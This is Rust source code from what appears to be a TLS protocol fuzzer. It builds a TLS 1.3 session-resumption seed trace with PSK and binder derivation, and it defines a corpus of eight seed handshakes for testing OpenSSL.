/// Seed which contains the whole transcript in the tree. This is rather huge 10k symbols. It grows
/// exponentially.
pub fn seed_session_resumption_dhe_full(
    initial_server: AgentName,
    server: AgentName,
    put_type: PUTType,
) -> Trace {
    let (
        initial_handshake,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    ) = seed_client_attacker_full(initial_server, put_type);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsMessageType::ApplicationData)]), // Ticket?
            (@server_hello_transcript),
            (@server_finished_transcript),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                (fn_client_extensions_append(
                                    fn_client_extensions_new,
                                    fn_secp384r1_support_group_extension
                                )),
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        fn_key_share_deterministic_extension
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )
    };

    let psk = term! {
        fn_derive_psk(
                (@server_hello_transcript),
                (@server_finished_transcript),
                (@client_finished_transcript),
                (fn_get_server_key_share(((initial_server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
                (fn_get_ticket_nonce((@new_ticket_message)))
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    let resumption_server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript,
                (@full_client_hello) // ClientHello
            )),
            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]) // plaintext ServerHello
        )
    };

    let resumption_encrypted_extensions = term! {
        fn_decrypt_handshake(
            ((server, 0)[Some(TlsMessageType::ApplicationData)]), // Encrypted Extensions
            (@resumption_server_hello_transcript),
            (fn_get_server_key_share(((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))), //
            (fn_psk((@psk))),
            fn_seq_0  // sequence 0
        )
    };

    let resumption_encrypted_extension_transcript = term! {
        fn_append_transcript(
            (@resumption_server_hello_transcript),
            (@resumption_encrypted_extensions) // plaintext Encrypted Extensions
        )
    };

    let resumption_server_finished = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsMessageType::ApplicationData)]), // Server Handshake Finished
            (@resumption_server_hello_transcript),
            (fn_get_server_key_share(((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))), //
            (fn_psk((@psk))),
            fn_seq_1 // sequence 1
        )
    };

    let resumption_server_finished_transcript = term! {
        fn_append_transcript(
            (@resumption_encrypted_extension_transcript),
            (@resumption_server_finished) // plaintext Server Handshake Finished
        )
    };

    let resumption_client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (@resumption_server_finished_transcript),
                (@resumption_server_hello_transcript),
                (fn_get_server_key_share(((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
                (fn_psk((@psk)))
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            server: true,
            try_reuse: false,
            put_type,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@resumption_client_finished),
                            (@resumption_server_hello_transcript),
                            (fn_get_server_key_share(((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
                            (fn_psk((@psk))),
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn create_corpus() -> [(Trace, &'static str); 8] {
    let agent_a = AgentName::first();
    let agent_b = agent_a.next();

    let put_type = PUTType::OpenSSL;

    [
        (
            seed_successful(agent_a, agent_b, put_type),
            "seed_successful",
        ),
        (
            seed_successful_with_ccs(agent_a, agent_b, put_type),
            "seed_successful_with_ccs",
        ),
        (
            seed_successful_with_tickets(agent_a, agent_b, put_type),
            "seed_successful_with_tickets",
        ),
        (
            seed_successful12(agent_a, agent_b, put_type),
            "seed_successful12",
        ),
        (
            seed_client_attacker(agent_a, put_type),
            "seed_client_attacker",
        ),
        (
            seed_client_attacker12(agent_a, put_type),
            "seed_client_attacker12",
        ),
        (
            seed_session_resumption_dhe(agent_a, agent_b, put_type),
            "seed_session_resumption_dhe",
        ),
        (
            seed_session_resumption_ke(agent_a, agent_b, put_type),
            "seed_session_resumption_ke",
        ),
    ]
}
